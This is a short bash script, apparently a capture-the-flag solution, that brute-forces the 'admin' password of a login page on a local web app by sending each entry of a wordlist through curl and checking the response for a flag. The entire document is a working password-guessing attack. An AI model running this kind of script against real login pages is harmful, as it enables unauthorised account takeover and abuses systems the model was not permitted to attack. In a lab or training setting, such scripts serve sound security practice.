#!/bin/bash

URL="http://127.0.0.1:8080/index.php?page=signin"
USERNAME="admin"
PASSWORD_FILE="pass.txt"

# Lire chaque mot de passe dans pass.txt et tester
while read -r PASSWORD; do
    echo "Trying password: $PASSWORD"
    RESPONSE=$(curl -s -X POST "http://127.0.0.1:8080/index.php?page=signin&username=$USERNAME&password=$PASSWORD&Login=Login")
    
    if echo "$RESPONSE" | grep -q 'flag'; then
        echo "Flag found with password: $PASSWORD"
        echo "$RESPONSE" | grep 'flag'
        break
    fi
done < "$PASSWORD_FILE"
